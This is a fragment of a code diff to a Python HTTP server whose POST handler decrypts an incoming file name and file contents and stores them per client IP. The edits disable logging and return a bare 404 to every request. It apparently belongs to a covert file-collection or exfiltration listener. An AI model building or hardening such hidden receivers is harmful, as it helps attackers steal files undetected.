@@ -32,7 +32,7 @@ class S(BaseHTTPRequestHandler):
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
-        logging.info(post_data.decode('utf-8'))
+        # logging.info(post_data.decode('utf-8'))
         di = post_data.index(b"\t")
         f_e = e.decrypt(post_data[:di]).decode('utf-8')
         d_e = e.decrypt(post_data[di + 1:]).decode('utf-8')
@@ -41,7 +41,7 @@ class S(BaseHTTPRequestHandler):
         else:
             file_proc(f_e, d_e, self.client_address[0])
 
-        self.send_error(404, DEFAULT_ERROR_MESSAGE)
+        self.send_error(404)
         self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
 
 
